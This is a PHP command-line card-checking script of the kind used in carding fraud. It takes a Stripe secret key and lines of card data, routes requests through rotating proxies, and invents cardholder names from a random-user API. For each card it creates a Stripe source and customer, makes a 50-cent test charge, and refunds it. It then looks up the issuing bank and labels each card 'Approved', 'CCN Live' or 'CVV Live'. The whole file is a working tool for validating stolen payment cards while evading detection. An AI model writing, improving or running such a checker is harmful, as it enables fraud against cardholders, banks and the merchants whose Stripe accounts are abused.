<?php

date_default_timezone_set('America/Buenos_Aires');

// --- VALIDATE COMMAND-LINE ARGUMENTS ---
if (!isset($argv[1]) || !isset($argv[2])) {
    die("Error: Missing Stripe key or CC list arguments.");
}

// --- RECEIVE DATA ---
// Data comes from command-line arguments, not $_GET
$sk = $argv[1];
$lista = $argv[2];

// The rest of your script is EXACTLY the same as before
function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

function GetStr($string, $start, $end) {
    if (strpos($string, $start) === false || strpos($string, $end) === false) {
        return "";
    }
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", " "), $lista)[3];

// --- PROXY CONFIGURATION ---
$username = 'Put Zone Username Here';
$password = 'Put Zone Password Here';
$port = 22225; 
$session = mt_rand();
$super_proxy = 'proxy.zyte.com'; 
$proxy_url = "http://$username-session-$session:$password@$super_proxy:$port";

// --- RANDOM USER DATA ---
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];

// --- STRIPE API CALLS ---
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxy_url);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.'+'.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');
$result1 = curl_exec($ch);
$s = json_decode($result1, true);
$token = $s['id'];

if ($token) {
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$name.' '.$last.'&source='.$token.'');
    $result2 = curl_exec($ch);
    $cus = json_decode($result2, true);
    $token3 = $cus['id'];
} else {
    $result2 = "{}";
    $token3 = null;
}

$chtoken = null;
if ($token3) {
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=50&currency=usd&customer='.$token3.'');
    $result3 = curl_exec($ch);
    $chtoken = trim(strip_tags(getStr($result3, '"id": "','"')));
} else {
    $result3 = "{}";
}

if ($chtoken) {
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/refunds');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'charge='.$chtoken.'&amount=50&reason=requested_by_customer');
    $result4 = curl_exec($ch);
}

// --- BIN LOOKUP ---
$cctwo = substr($cc, 0, 6);
curl_close($ch);

$ch_bin = curl_init();
curl_setopt($ch_bin, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo);
curl_setopt($ch_bin, CURLOPT_USERAGENT, 'Mozilla/5.0');
curl_setopt($ch_bin, CURLOPT_RETURNTRANSFER, 1);
$fim = curl_exec($ch_bin);
curl_close($ch_bin);

$fim = json_decode($fim, true);
$bank = $fim['bank']['name'] ?? 'N/A';
$country = $fim['country']['alpha2'] ?? 'N/A';
$type = $fim['type'] ?? 'N/A';

// --- RESPONSE LOGIC ---
if (strpos($result3, '"seller_message": "Payment complete."')) {
    echo '<span class="badge badge-success">#Approved</span> ◈ <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (Charge & Refund) ✅」</span> ◈<span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span>';
} elseif (strpos($result3, '"cvc_check": "pass"')) {
    echo '<span class="badge badge-success">#Approved</span> ◈ <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (CVV Pass) ✔️」</span> ◈<span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span>';
} elseif (strpos($result2, '"code": "incorrect_cvc"') || strpos($result1, '"code": "invalid_cvc"')) {
    echo '<span class="badge badge-success">#Approved</span> ◈ <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-warning"> 「CCN Live (Incorrect CVV) 🟡」</span> ◈<span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span>';
} elseif (strpos($result3, "insufficient_funds")) {
    echo '<span class="badge badge-success">#Approved</span> ◈ <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-warning"> 「CVV Live (Insufficient Funds) 💰」</span> ◈<span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span>';
} else {
    echo '<span class="badge badge-danger">#Declined</span> ◈ <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-warning"> 「An Unknown Error Occurred ❓」</span> ◈<span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span>';
}
?>
